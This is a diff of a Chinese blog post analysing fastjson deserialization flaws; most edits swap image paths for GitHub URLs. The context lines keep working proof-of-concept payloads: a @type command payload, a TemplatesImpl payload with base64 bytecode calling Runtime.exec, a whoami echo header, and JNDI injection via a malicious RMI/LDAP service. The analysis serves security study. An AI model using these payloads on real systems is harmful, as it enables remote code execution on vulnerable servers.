@@ -1,7 +1,7 @@
 ---
 title: fastjson反序列化漏洞原理及扩展
 date: 2021-08-29 18:05:49
-categories: 
+categories:
 - 代码审计
 tags:
 - fastjson反序列
@@ -22,7 +22,7 @@ Fastjson反序列化采用两个函数：
 JSON.parseObject()，JSON.parse()。
 
 简单写一个demo来查看两者区别：
-![1](1.png)
+![1](https://raw.githubusercontent.com/h1iba1/h1iba1.github.io/refs/heads/master/_posts/JAVA安全/fastjson反序列化漏洞原理及扩展/1.png)
 
 `parseObject`：默认返回 `fastjson.JSONObject` 类。
 
@@ -30,7 +30,7 @@ parse：默认返回@type指定的user类。
 
 parseObject也可以添加`Object.class`参数来返回user类。
 
-![2](2.png)
+![2](https://raw.githubusercontent.com/h1iba1/h1iba1.github.io/refs/heads/master/_posts/JAVA安全/fastjson反序列化漏洞原理及扩展/2.png)
 
 ### @type
 
@@ -106,15 +106,15 @@ post
 {"@type":"com.example.demo.entity.EvilEntity","cmd":"open -a Calculator"}
 ```
 
-![3](3-9873980.png)
+![3](https://raw.githubusercontent.com/h1iba1/h1iba1.github.io/refs/heads/master/_posts/JAVA安全/fastjson反序列化漏洞原理及扩展/3-9873980.png)
 
 @type将我们序列化的数据转为了EvilEntity类型。`obj.getClass().getName();`获取对象类名可看到已经转为了EvilEntity类。
 
-![4](4.png)
+![4](https://raw.githubusercontent.com/h1iba1/h1iba1.github.io/refs/heads/master/_posts/JAVA安全/fastjson反序列化漏洞原理及扩展/4.png)
 
 自动调用转换类型的set方法，进行赋值。
 
-![5](5.png)
+![5](https://raw.githubusercontent.com/h1iba1/h1iba1.github.io/refs/heads/master/_posts/JAVA安全/fastjson反序列化漏洞原理及扩展/5.png)
 
 @type流程自动调用setter/getter底层流程感兴趣的可以跟一跟
 
@@ -122,13 +122,13 @@ post
 
 简单跟了一下...
 
-![6](6.png)
+![6](https://raw.githubusercontent.com/h1iba1/h1iba1.github.io/refs/heads/master/_posts/JAVA安全/fastjson反序列化漏洞原理及扩展/6.png)
 
 ## templatesImpl链条分析
 
 TemplatesImpl这条链熟悉cc2的朋友可能会了解。调用流程如下；
 
-![7](7.png)
+![7](https://raw.githubusercontent.com/h1iba1/h1iba1.github.io/refs/heads/master/_posts/JAVA安全/fastjson反序列化漏洞原理及扩展/7.png)
 
 ```java
 TemplatesImpl#getOutputProperties()->TemplatesImpl#newTransformer()->TemplatesImpl#getTransletInstance()->TemplatesImpl#definerTransletClasses()->TransletClassLoader#defineClass()
@@ -217,7 +217,7 @@ public class HelloTemplatesImpl extends AbstractTranslet {
 
 执行即可实例化字节码，造成代码执行。
 
-![8](8.png)
+![8](https://raw.githubusercontent.com/h1iba1/h1iba1.github.io/refs/heads/master/_posts/JAVA安全/fastjson反序列化漏洞原理及扩展/8.png)
 
 ### 那么TemplatesImpl链条如何和fastjson结合起来呢？
 
@@ -227,7 +227,7 @@ https://paper.seebug.org/636/
 
 smartMatch会替换key中的_为空，`_outputProperties` 就转换成 `outputProperties`。
 
-![9](9.png)
+![9](https://raw.githubusercontent.com/h1iba1/h1iba1.github.io/refs/heads/master/_posts/JAVA安全/fastjson反序列化漏洞原理及扩展/9.png)
 
 结合一开始说过的@type特性，自动调用getter方法，此时就会去调用getOutputProperties方法。就进入了templatesImpl链
 
@@ -246,7 +246,7 @@ Payload:
 {"@type":"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl","_bytecodes":["yv66vgAAADQANQoACwAaCQAbABwIAB0KAB4AHwoAIAAhCAAiCgAgACMHACQKAAgAJQcAJgcAJwEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAApFeGNlcHRpb25zBwAoAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABjxpbml0PgEAAygpVgEADVN0YWNrTWFwVGFibGUHACYHACQBAApTb3VyY2VGaWxlAQAXSGVsbG9UZW1wbGF0ZXNJbXBsLmphdmEMABMAFAcAKQwAKgArAQATSGVsbG8gVGVtcGxhdGVzSW1wbAcALAwALQAuBwAvDAAwADEBABJvcGVuIC1hIENhbGN1bGF0b3IMADIAMwEAE2phdmEvaW8vSU9FeGNlcHRpb24MADQAFAEAEkhlbGxvVGVtcGxhdGVzSW1wbAEAQGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ydW50aW1lL0Fic3RyYWN0VHJhbnNsZXQBADljb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvVHJhbnNsZXRFeGNlcHRpb24BABBqYXZhL2xhbmcvU3lzdGVtAQADb3V0AQAVTGphdmEvaW8vUHJpbnRTdHJlYW07AQATamF2YS9pby9QcmludFN0cmVhbQEAB3ByaW50bG4BABUoTGphdmEvbGFuZy9TdHJpbmc7KVYBABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7AQAPcHJpbnRTdGFja1RyYWNlACEACgALAAAAAAADAAEADAANAAIADgAAABkAAAADAAAAAbEAAAABAA8AAAAGAAEAAAAMABAAAAAEAAEAEQABAAwAEgACAA4AAAAZAAAABAAAAAGxAAAAAQAPAAAABgABAAAADgAQAAAABAABABEAAQATABQAAQAOAAAAbAACAAIAAAAeKrcAAbIAAhIDtgAEuAAFEga2AAdXpwAITCu2AAmxAAEADAAVABgACAACAA8AAAAeAAcAAAAQAAQAEQAMABQAFQAXABgAFQAZABYAHQAYABUAAAAQAAL/ABgAAQcAFgABBwAXBAABABgAAAACABk="],'_name':'a.b','_tfactory':{},"_outputProperties":{ },"_name":"a","allowedProtocols":"all"}
 ```
 
-![10](10.png)
+![10](https://raw.githubusercontent.com/h1iba1/h1iba1.github.io/refs/heads/master/_posts/JAVA安全/fastjson反序列化漏洞原理及扩展/10.png)
 
 ### BasicDataSource：
 
@@ -283,7 +283,7 @@ cmd: whoami  (数据头)
 }
 ```
 
-![30](30.png)
+![30](https://raw.githubusercontent.com/h1iba1/h1iba1.github.io/refs/heads/master/_posts/JAVA安全/fastjson反序列化漏洞原理及扩展/30.png)
 
 
 
@@ -369,17 +369,17 @@ public class EvilObject {
 
 3.运行FjPoc请求我们启动rmi恶意服务。
 
-![11](11.png)
+![11](https://raw.githubusercontent.com/h1iba1/h1iba1.github.io/refs/heads/master/_posts/JAVA安全/fastjson反序列化漏洞原理及扩展/11.png)
 
 分析：
 
 定位到：lib/rt.jar!/com/sun/rowset/JdbcRowSetImpl.class
 
-![12](12.png)
+![12](https://raw.githubusercontent.com/h1iba1/h1iba1.github.io/refs/heads/master/_posts/JAVA安全/fastjson反序列化漏洞原理及扩展/12.png)
 
 跟进this.connect()。
 
-![13](13.png)
+![13](https://raw.githubusercontent.com/h1iba1/h1iba1.github.io/refs/heads/master/_posts/JAVA安全/fastjson反序列化漏洞原理及扩展/13.png)
 
 ```
 this.getDataSourceName()
@@ -387,7 +387,7 @@ this.getDataSourceName()
 
 this.getDataSourceName()获取到了我们传入的rmi链接。然后请求我们的rmi恶意服务，
 
-![14](14.png)
+![14](https://raw.githubusercontent.com/h1iba1/h1iba1.github.io/refs/heads/master/_posts/JAVA安全/fastjson反序列化漏洞原理及扩展/14.png)
 
 **jdbcRowSetImpl链调用流程**：
 
@@ -395,7 +395,7 @@ this.getDataSourceName()获取到了我们传入的rmi链接。然后请求我�
 JdbcRowSetImpl#setAutoCommit()->this.conn=this.connect()->JdbcRowSetImpl#lookup()->RegistryContext#decodeObject()->NamingManager#getObjectFactoryFromReference()->VersionHelper12#loadClass()
 ```
 
-![31](31.png)
+![31](https://raw.githubusercontent.com/h1iba1/h1iba1.github.io/refs/heads/master/_posts/JAVA安全/fastjson反序列化漏洞原理及扩展/31.png)
 
 
 
@@ -420,13 +420,13 @@ Connection: close
 
 
 
-![22](22.png)
+![22](https://raw.githubusercontent.com/h1iba1/h1iba1.github.io/refs/heads/master/_posts/JAVA安全/fastjson反序列化漏洞原理及扩展/22.png)
 
 利用jdbcRowSetImpl链进行jndi注入。
 
 利用fastjson_tool.jar起一个ldap恶意服务。
 
-![23](23.png)
+![23](https://raw.githubusercontent.com/h1iba1/h1iba1.github.io/refs/heads/master/_posts/JAVA安全/fastjson反序列化漏洞原理及扩展/23.png)
 
 Post payload:
 
@@ -447,19 +447,19 @@ Connection: close
 
 ```
 
-![24](24.png)
+![24](https://raw.githubusercontent.com/h1iba1/h1iba1.github.io/refs/heads/master/_posts/JAVA安全/fastjson反序列化漏洞原理及扩展/24.png)
 
 ## fastjson配合jdbc序列化
 
 jdbc序列化之前在实战中也遇到过两次，感觉还是比较实用的，只要能控制mysql的jdbc链接，就能控制mysql客户端链接我们的恶意mysql服务，造成序列化漏洞。
 
-![27](27.png)
+![27](https://raw.githubusercontent.com/h1iba1/h1iba1.github.io/refs/heads/master/_posts/JAVA安全/fastjson反序列化漏洞原理及扩展/27.png)
 
 详情可以看丁师傅的文章：https://xz.aliyun.com/t/9250
 
 今年的blankhat上面，玄武实验室披露了几条fastjson利用jdbc序列化的链条。
 
-![26](26.png)
+![26](https://raw.githubusercontent.com/h1iba1/h1iba1.github.io/refs/heads/master/_posts/JAVA安全/fastjson反序列化漏洞原理及扩展/26.png)
 
 简单复现一下。
 
@@ -559,7 +559,7 @@ Content-Length: 449
 }
 ```
 
-![28](28.png)
+![28](https://raw.githubusercontent.com/h1iba1/h1iba1.github.io/refs/heads/master/_posts/JAVA安全/fastjson反序列化漏洞原理及扩展/28.png)
 
 
 
